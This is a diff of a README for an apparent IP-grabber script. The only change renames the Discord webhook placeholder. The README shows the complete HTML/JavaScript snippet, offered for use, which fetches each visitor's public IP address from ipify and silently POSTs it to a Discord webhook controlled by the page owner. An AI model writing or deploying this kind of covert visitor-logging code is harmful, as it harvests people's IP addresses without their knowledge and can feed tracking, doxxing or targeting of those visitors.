@@ -15,13 +15,13 @@ The script uses JavaScript's `fetch` API to send a GET request to `https://api.i
 
 ## Usage
 
-Simply include the script in your HTML file. Just make sure to replace **'YOUR_DISCORD_WEBHOOK_HERE'** with your actual Discord webhook URL.:
+Simply include the script in your HTML file. Just make sure to replace **'YOUR_DISCORD_WEBHOOK'** with your actual Discord webhook URL.:
 
 ```html
 <script>
   fetch('https://api.ipify.org')
     .then(response => response.text())
-    .then(ip => fetch('YOUR_DISCORD_WEBHOOK_HERE', {
+    .then(ip => fetch('YOUR_DISCORD_WEBHOOK', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: ip })
